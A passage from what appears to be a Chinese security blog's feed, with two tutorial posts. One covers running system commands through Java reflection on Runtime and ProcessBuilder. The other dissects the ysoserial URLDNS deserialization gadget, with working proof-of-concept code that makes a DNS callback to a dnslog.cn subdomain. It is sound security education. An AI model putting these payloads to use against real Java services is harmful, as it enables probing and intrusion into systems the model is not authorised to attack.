    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>首发：<a href="https://www.sec-in.com/article/307" target="_blank" rel="noopener">https://www.sec-in.com/article/307</a><br>&emsp;&emsp; 欢迎回来，上回说到Java反射机制基础知识，并用简单代码做了一个简单的Demo。<br>&emsp;&emsp;笔者从执行命令的角度来展开话题，看这篇文章大部分都是网络安全的从业者亦或者是安全规范的学习者，众所周知执行命令获取权限是安全人员追求，也是黑客最终追求。所以从执行命令的角度来展开，无疑是激发你们读者最大阅读兴趣。</p><p> ps: 本文实验代码都上传<a href="https://github.com/samny520/JavaLearnVulnerability" target="_blank" rel="noopener">JavaLearnVulnerability</a>项目，为了让更多人知道，麻烦动动小手star一下。</p><hr><h1 id="知识补充"><a href="#知识补充" class="headerlink" title="知识补充"></a>知识补充</h1><p>&emsp;&emsp; 这里稍微补充一点小知识，对于一些0基础的读者的一些知识补充，老司机可以忽视。Java执行命令常见的有两个类<code>java.lang.Runtime</code>和<code>java.lang.ProcessBuilder</code>，通常情况下使用<code>java.lang.Runtime</code>类，个人觉得Runtime类是比ProcessBuilder好使用些。</p><h2 id="windows下执行命令的几种方式"><a href="#windows下执行命令的几种方式" class="headerlink" title="windows下执行命令的几种方式"></a>windows下执行命令的几种方式</h2><ol><li>Windows下调用程序 <blockquote><p>Process proc =Runtime.getRuntime().exec(“exefile”);</p><ol start="2"><li>Windows下调用系统命令<br>String [] cmd={“cmd”,”/C”,”copy exe1 exe2”};<br>Process proc =Runtime.getRuntime().exec(cmd);</li><li>Windows下调用系统命令并弹出命令行窗口<br>String [] cmd={“cmd”,”/C”,”start copy exe1 exe2”};<br>Process proc =Runtime.getRuntime().exec(cmd);</li></ol></blockquote><h2 id="Linux下执行命令的几种方式"><a href="#Linux下执行命令的几种方式" class="headerlink" title="Linux下执行命令的几种方式"></a>Linux下执行命令的几种方式</h2><ol><li>Linux下调用程序<blockquote><p>Process proc =Runtime.getRuntime().exec(“./exefile”);</p></blockquote></li><li>Linux下调用系统命令<blockquote><p>String [] cmd={“/bin/sh”,”-c”,”ln -s exe1 exe2”};<br>Process proc =Runtime.getRuntime().exec(cmd);</p></blockquote></li><li>Linux下调用系统命令并弹出命令行窗口<blockquote><p>String [] cmd={“/bin/sh”,”-c”,”xterm -e ln -s exe1 exe2”};<br>Process proc =Runtime.getRuntime().exec(cmd);</p></blockquote></li></ol></li></ol><hr><h1 id="反射之Runtime"><a href="#反射之Runtime" class="headerlink" title="反射之Runtime"></a>反射之Runtime</h1><p><img src="https://img-blog.csdnimg.cn/20200428212414156.gif" alt="在这里插入图片描述"></p><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><blockquote><p>Object ob = cls.getMethod(“getRuntime”,null).invoke(null,null);<br>返回的是一个Runtime类对象<br>前文说过，invoke第一个参数是一个<code>Object类对象</code><br>你可能好奇为什么我不直接使用<code>newInstance()</code>呢？<br>因为Runtime类中的无参构造方法是private权限，无法访问。ps：其实是有办法的，下文会说道。<br><code>getRuntime</code>方法返回的是Runtime类对象，这就是为什么有些payload会使用此方法了，而不是直接newInstanc()</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200428204852586.png" alt="在这里插入图片描述"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Method1</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//获取对象</span></span><br><span class="line">            Class cls = Class.forName(<span class="string">"java.lang.Runtime"</span>);</span><br><span class="line">            <span class="comment">//实例化对象</span></span><br><span class="line">            Object ob = cls.getMethod(<span class="string">"getRuntime"</span>,<span class="keyword">null</span>).invoke(<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">            <span class="comment">// 反射调用执行命令</span></span><br><span class="line">            cls.getMethod("exec", String.class).invoke(ob,"calc");</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><hr><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><blockquote><p>前文说过java.lang.Runtime类无参构造方法是private权限无法直接调用<br>setAccessible通过反射修改方法的访问权限，强制可以访问<br> Constructor constructor = cls.getDeclaredConstructor();是获取类构造器方法的方法</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Method2</span><span class="params">()</span></span>&#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="comment">// 获取对象</span></span><br><span class="line">           Class cls = Class.forName(<span class="string">"java.lang.Runtime"</span>);</span><br><span class="line">           <span class="comment">// 获取构造方法</span></span><br><span class="line">           Constructor constructor = cls.getDeclaredConstructor();</span><br><span class="line">           </span><br><span class="line">           constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">           <span class="comment">// 实例化对象</span></span><br><span class="line">           Object ob = constructor.newInstance();</span><br><span class="line">           Method mt = cls.getMethod(<span class="string">"exec"</span>, String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">           mt.invoke(ob,<span class="string">"calc"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       &#125; <span class="keyword">catch</span> (ClassNotFoundException | NoSuchMethodException e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><hr><h1 id="反射之ProcessBuilder"><a href="#反射之ProcessBuilder" class="headerlink" title="反射之ProcessBuilder"></a>反射之ProcessBuilder</h1><p><img src="https://img-blog.csdnimg.cn/20200428212703809.gif" alt="在这里插入图片描述"></p><p>通过看JDK文档，ProcessBuilder类有两个构造方法。<br><img src="https://img-blog.csdnimg.cn/20200428204717485.png" alt="在这里插入图片描述"><br>如果分别使用反射构造方法获取实例化语句如下：</p><ul><li><code>Class.forName(&quot;java.lang.ProcessBuilder&quot;).getDeclaredConstructor(List.class).newInstance(Arrays.asList(&quot;calc&quot;)))</code></li><li><code>Class.forName(&quot;java.lang.ProcessBuilder&quot;).getDeclaredConstructor(String.class).newInstance(&quot;calc&quot;))</code></li></ul><h2 id="方法一-1"><a href="#方法一-1" class="headerlink" title="方法一"></a>方法一</h2><p>&emsp;&emsp; 方法一笔者在此就提一点，<code>newInstance()</code>实例化时把所需要执行命令参数直接一并进行了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Method1</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取对象</span></span><br><span class="line">            Class cls = Class.forName(<span class="string">"java.lang.ProcessBuilder"</span>);</span><br><span class="line">            <span class="comment">// 实例化对象</span></span><br><span class="line">            Object ob = cls.getDeclaredConstructor(List<span class="class">.<span class="keyword">class</span></span></span><br><span class="line">            ).newInstance(Arrays.asList("calc"));</span><br><span class="line">            <span class="comment">// 执行命令</span></span><br><span class="line">            cls.getMethod(<span class="string">"start"</span>).invoke(ob,<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException | NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><hr><h2 id="方法二-1"><a href="#方法二-1" class="headerlink" title="方法二"></a>方法二</h2><p>&emsp;&emsp; 方法二使用第二种构造方法，可变长参数(<code>String...</code>表示参数长度不确定)。那么对于反射来说，如果要获取目标函数里包含的可变长参数，可直接视为数组。因此只需要将<code>String [].class</code>传给构造方法即可，但在调用<code>newInstance()</code>实例化方法时，不能直接传一个一维数组<code>String[]{“calc&quot;}</code>，而是应该传入一个二维数组<code>String[][]calc</code>。因为<code>newInstance()</code>函数本身接收的是一个可变长参数，我们传给<code>ProcessBuilder</code>的也是一个可变长参数，二者叠加由一维数组变成了二维数组。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Method2</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取对象</span></span><br><span class="line">            Class cls = Class.forName(<span class="string">"java.lang.ProcessBuilder"</span>);</span><br><span class="line">            <span class="comment">// 实例化对象</span></span><br><span class="line">            </span><br><span class="line">            String[][] cls2 = <span class="keyword">new</span> String[][]&#123;&#123;<span class="string">"calc"</span>&#125;&#125;;</span><br><span class="line">            Object ob = cls.getConstructor(String[]<span class="class">.<span class="keyword">class</span>).<span class="title">newInstance</span>(<span class="title">cls2</span>)</span>;</span><br><span class="line">            <span class="comment">//执行命令</span></span><br><span class="line">            cls.getMethod(<span class="string">"start"</span>).invoke(ob,<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException | NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/7029#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/7029#toc-3</a><br><a href="https://javasec.org/javase/Reflection/Reflection.html" target="_blank" rel="noopener">https://javasec.org/javase/Reflection/Reflection.html</a><br>JDK文档<br>Java安全漫谈-反射篇 –P牛著。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;首发：&lt;a href=&quot;https://www.sec-in.com/article/307&quot; target=&quot;_blank&quot; rel=&quot;n
      
    
    </summary>
    
    
      <category term="代码审计" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="Java反射" scheme="http://yoursite.com/tags/Java%E5%8F%8D%E5%B0%84/"/>
    
  </entry>
  
  <entry>
    <title>小楼昨夜又春风，你知ysoserial-Gadget-URLDNS多少？</title>
    <link href="http://yoursite.com/2020/05/06/%E5%B0%8F%E6%A5%BC%E6%98%A8%E5%A4%9C%E5%8F%88%E6%98%A5%E9%A3%8E%EF%BC%8C%E4%BD%A0%E7%9F%A5ysoserial-Gadget-URLDNS%E5%A4%9A%E5%B0%91%EF%BC%9F/"/>
    <id>http://yoursite.com/2020/05/06/%E5%B0%8F%E6%A5%BC%E6%98%A8%E5%A4%9C%E5%8F%88%E6%98%A5%E9%A3%8E%EF%BC%8C%E4%BD%A0%E7%9F%A5ysoserial-Gadget-URLDNS%E5%A4%9A%E5%B0%91%EF%BC%9F/</id>
    <published>2020-05-06T04:42:16.000Z</published>
    <updated>2020-05-06T07:17:45.990Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>文章首发：<a href="https://www.sec-in.com/article/299" target="_blank" rel="noopener">https://www.sec-in.com/article/299</a><br>&emsp;&emsp;2015年Gabriel Lawrence(@gebl)和Chris Frohoff(@frohoff)在AppSecCali大会上提出的利用Apache Commons Collections来构造命令执行利用链，随后发布ysoserial工具，从此打开Java安全的蓝海。<br>&emsp;&emsp; 利用链(gadget chains)，俗称gadget。通俗来说就是一种利用方法，它是从触发位置开始到执行命令的位置结束，也可以说是漏洞验证方法(POC)。<br>&emsp;&emsp; 使用方法，GitHub下载jar包或者git源码自己编译。</p><blockquote><p>java -jar ysoseial.jar URLDNS “<a href="http://baidu.com&quot;" target="_blank" rel="noopener">http://baidu.com&quot;</a></p></blockquote><p>再将生成号POC发送目标，如果目标存在反序列化漏洞，并且满足利用链条件，则命令将会被执行。</p><p>ps: 本文实验代码都上传<a href="https://github.com/samny520/JavaLearnVulnerability" target="_blank" rel="noopener">JavaLearnVulnerability</a>项目，为了让更多人知道，麻烦动动小手star一下。</p><hr><h1 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h1><p> &emsp;&emsp; <code>URLDNS</code>是其中的一个gadget的名字，此gadget不能执行命令，通常用来验证目标是否存在反序列化漏洞。URLDNS gadget十分适合用来验证目标是否存在反序列化漏洞。</p><ul><li>此gadget完全使用Java内置的类构造，无需第三方库支持。</li><li>如果目标没有回显，通过DNS解析请求是否存在来判断存在反序列化漏洞。</li></ul><hr><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>打开<code>https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java</code>查看源码，但笔者这里使用自己改写的源码来分析此gadget链。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> samny.serializable;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> samny.util.Reflections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">urldns</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        URLStreamHandler handler = <span class="keyword">new</span> URLStreamHandler() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">protected</span> URLConnection <span class="title">openConnection</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span></span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        HashMap hm = <span class="keyword">new</span> HashMap();</span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="keyword">null</span>,<span class="string">"http://4h9yq1.dnslog.cn"</span>,handler);</span><br><span class="line">        hm.put(url,url);</span><br><span class="line"></span><br><span class="line">        Reflections.setFieldValue(url,<span class="string">"hashCode"</span>,-<span class="number">1</span>);</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"url"</span>));</span><br><span class="line">        oos.writeObject(hm);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"url"</span>));</span><br><span class="line"><span class="comment">// 注释这行代码是不会产生dns解析请求，</span></span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>&emsp;&emsp; 漏洞分析之前，我们先看看漏洞执行效果。<br>&emsp;&emsp; 分析一个在线dns解析记录网站<a href="http://www.dnslog.cn" target="_blank" rel="noopener">DNSlog Platform</a>，网站无需任何登录注册，国内访问速度也快，DNS记录获取速度没得说，子域名可以无限更换。<br><img src="https://img-blog.csdnimg.cn/20200427153912402.png" alt="在这里插入图片描述"><br><strong>漏洞复现步骤</strong></p><ol><li>修改你能过记录dns解析的网址。<br><img src="https://img-blog.csdnimg.cn/20200427154428787.png" alt="在这里插入图片描述"></li><li>直接运行main方法，刷新记录。</li></ol><h2 id="断点分析"><a href="#断点分析" class="headerlink" title="断点分析"></a>断点分析</h2><p>&emsp;&emsp; 触发反序列化漏洞的方法是<code>readObject</code>，所以笔者在43行代码处和<code>hashmap</code>的<code>readObject</code>各设置一个断点。<br>PS:</p><ul><li>以免dns记录混淆，建议每次分析都换一个域名。</li><li>此处会有一个问题就是我们到底怎么在JDK包中找到HashMap这个类的readobject函数呢？因为JDK的类超级多，难道我们必须要一个个翻找？</li><li>其实搜索是可以搜索导入包的内容的，<code>Ctrl+Shift+F</code> 在<code>Scope - All Places</code>搜索<code>class hashmap</code>即可。<br><img src="https://img-blog.csdnimg.cn/20200427155537417.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 断点设置好了，开始分析，笔者这里直接从HashMap.java的<code>readObject</code>开始分析。<br>hashmap中readObject会调用putVal方法是往HashMap中放入键值对的方法，进而会计算hashcode值。<br><img src="https://img-blog.csdnimg.cn/20200427155709722.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 接着会判断key是否为空，hashCode是否不等于-1，不等于-1会直接返回，等于-1会重新计算。这时候我们看笔者写源码36行，修改方法hashCode的值为-1，这时你是否明白此时的用意。<br><img src="https://img-blog.csdnimg.cn/20200427160955616.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200427161035866.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200427161223686.png" alt="在这里插入图片描述"></li></ul><p>&emsp;&emsp; 计算<code>hash</code>的时候会跳转到<code>java.net.URLStreamHandler.java#hashCode</code>方法来计算hash。注意看图片中被框住的一行代码，hashCode在计算hash时，会调用<code>getHostAddress()</code>方法，进而调用<code>getByName(host)</code>方法。<br><img src="https://img-blog.csdnimg.cn/20200427161513369.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 执行方法，我们发现会有一个等待时间大概2秒钟之后(其实就是DNS解析所需要的时间)，可以获取DNS解析记录。<br><img src="https://img-blog.csdnimg.cn/20200427162302103.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20200427162013698.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020042716232791.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200427162708718.png" alt="在这里插入图片描述"></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>&emsp;&emsp; 整个的<code>URLDNS</code>的gadget其实清晰又简单。</p><ol><li>HashMap-&gt;readObject()</li><li>HashMap-&gt;hash()</li><li>URL-&gt;hashCode()</li><li>URLStreamHandler-&gt;hashCode()</li><li>URLStreamHandler-&gt;getHostAddress()</li><li>InetAddress-&gt;getByName()</li></ol><p>&emsp;&emsp; 其实作者在博客中写道，可以用四行代码就可以实现此gadget chains，反观ysoserial中源码，去掉注释也多还有几行代码，<code>多出的代码时干嘛的呢？</code></p><p><img src="https://img-blog.csdnimg.cn/20200427164430117.png" alt="在这里插入图片描述"></p><h2 id="巧妙避免重复"><a href="#巧妙避免重复" class="headerlink" title="巧妙避免重复"></a>巧妙避免重复</h2><p>&emsp;&emsp; 多出几行代码，我们来分析一下。ysoserial的作者重写了URLStreamHandler其中两个方法。但是我们还没搞清楚其中的作用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">URLStreamHandler handler = <span class="keyword">new</span> URLStreamHandler() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">protected</span> URLConnection <span class="title">openConnection</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span></span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; 老规矩，断点撸码。不过此时断点应该设置在哪？笔者按照源作者的代码，去掉序列化和反序列化的过程。剩下代码也就上面的和下面图片给出的5行代码，分析不难发现断点应该设置在<code>hm.put()</code>。其中31和32行代码肯定是不会去设置断点的，至于36行在之前就说明其作用。<br><img src="https://img-blog.csdnimg.cn/20200427171425793.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 调试代码不能发现，put方法也和hashmap中的readObject方法的方法是差不多的，继续跟进。<br><img src="https://img-blog.csdnimg.cn/20200427171917233.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 继续跟进还是来到<code>java.net.URLStreamHandler#hashCode</code>方法，但此时方法会跳转到笔者复写的方法中，返回应该<code>null</code>，进而就不会去解析dns。<br><img src="https://img-blog.csdnimg.cn/20200427172155144.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200427172348537.png" alt="在这里插入图片描述"></p><hr><p>&emsp;&emsp; 为什么hashmap中putval方法就不会跳转到我们复现的类方法里面返回一个null呢？（个人见解，源码无法修改所以无法调试）<br>答：反序列化时应该时将二进制代码直接读取，进去调用hashmap中readObject方法，此时反序列化完全是使用jdk源码调用，不会再去看我们用户复写方法。<br>&emsp;&emsp; 笔者这里有点事实可以整明我的观点。<br>众所周知Java是代码是一行一行的去编译解释的，我们复现的类URLStreamHandler，实现的类对象hander在url进实例化的时候处理了，也就是33行代码。但是进行反序列化操作的时候，并没有将此复现方法进行序列化，所以反序列化的时候不会处理URL，计算hash值的时候，不可能跳转到我们复写的方法返回一个null，只能是跳转到原本的方法中。<br><img src="https://img-blog.csdnimg.cn/20200427174533677.png" alt="在这里插入图片描述"></p><hr><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>&emsp;&emsp; 当URL最初被放在HashMap中时，通过可以调用put，HashMap.hashMap.hash方法被调用。这个方法反过来又会调用该URL的hashCode，但是hashCode是有一个缓存值的，并不会触发DNS解析。但是我们可以在读取数据流的时候，在URL添加到HashMap中重置缓存值(使其hashCode=-1)，来确保DNS解析。可以使用Java的Reflection中setFieldValue方法来达到重置hashCode值为-1。<br>&emsp;&emsp; Ysoserial用一个类复写完美避免重复DNSLOG，感概其作者的神奇逻辑思维能力。有兴趣的朋友完全可以去注释掉<code>getHostAddress</code>方法亦或者是删除掉整个handler代码，然后就会出现DNSLOG。</p><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>P神Java安全漫谈 - 08.反序列化篇(2)<br><a href="https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/" target="_blank" rel="noopener">https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/</a><br><a href="https://lalajun.github.io/2020/03/05/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-ysoserial-URLDNS/" target="_blank" rel="noopener">https://lalajun.github.io/2020/03/05/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-ysoserial-URLDNS/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;文章首发：&lt;a href=&quot;https://www.sec-in.com/article/299&quot; target=&quot;_blank&quot; rel=
      
    
    </summary>
    
    
      <category term="代码审计" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="ysoserial-Gadget" scheme="http://yoursite.com/tags/ysoserial-Gadget/"/>
    
  </entry>
  
  <entry>
    <title>Skipped breakpoint because it happened inside debugger evaluation</title>
    <link href="http://yoursite.com/2020/05/05/Skipped%20breakpoint%20because%20it%20happened%20inside%20debugger%20evaluation/"/>
    <id>http://yoursite.com/2020/05/05/Skipped%20breakpoint%20because%20it%20happened%20inside%20debugger%20evaluation/</id>
    <published>2020-05-05T04:42:16.000Z</published>
    <updated>2020-05-06T07:21:37.897Z</updated>
    
